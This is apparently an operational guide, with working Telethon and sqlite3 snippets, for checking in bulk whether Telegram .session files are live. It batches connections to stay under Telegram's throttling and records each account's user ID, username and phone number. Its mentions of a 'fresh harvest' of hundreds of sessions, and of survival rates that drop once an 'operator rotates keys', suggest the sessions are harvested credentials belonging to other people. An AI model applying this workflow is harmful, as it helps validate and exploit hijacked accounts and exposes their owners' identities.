# Bulk Session Verification Guide

## When to Use
After batch-converting .session files, to verify they are alive against Telegram live servers.

## Methodology

### Safe Verification (no file corruption)
`SQLiteSession(path)` constructor modifies the database file on open (version check, upgrade).
**Never load the original file** - always verify a COPY:

```python
import shutil, tempfile, os
from telethon.sessions import SQLiteSession

def verify_copy(path):
    tmp = tempfile.mktemp(suffix='.session')
    shutil.copy2(path, tmp)
    try:
        sess = SQLiteSession(tmp)
        return sess.auth_key is not None and len(sess.auth_key.key) == 256
    finally:
        os.remove(tmp)
```

### Quick Structure Check (sqlite3, no Telethon)
```python
import sqlite3
conn = sqlite3.connect(path)
r = conn.execute("SELECT length(auth_key) FROM sessions").fetchone()
assert r and r[0] == 256
good_tables = {'version', 'sessions', 'entities', 'sent_files', 'update_state'}
tables = set(r[0] for r in conn.execute("SELECT name FROM sqlite_master""WHERE type='table'").fetchall())
assert tables == good_tables
```

### Batch Live Test (Telethon connect + get_me)
- batch size: 5 concurrent, 1s pause between batches
- timeout=8s per connection
- each session uses a fresh temp file copy
- results: ALIVE / DEAD (auth_key invalid) / CONNERR (network)
- ~10min for 300 sessions
- Rate control: single-threaded async; too much concurrency triggers silent DC throttling

### JSON Cards After Verification
Update JSON cards with confirmed data:
- `user_id`: from get_me().id
- `username`: from get_me().username
- `phone`: from get_me().phone
If verification fails (dead), keep original data but mark in manifest.

## Pitfalls
- Telethon 1.36 `proxy=('socks5', host, port)` param may cause `ConnectionError()` - skip proxy or set via env.
- Connection timeout does NOT equal dead session.
- Survive rate (fresh harvest): ~99% within 24h, drops to ~2.5-4% after operator rotates keys.
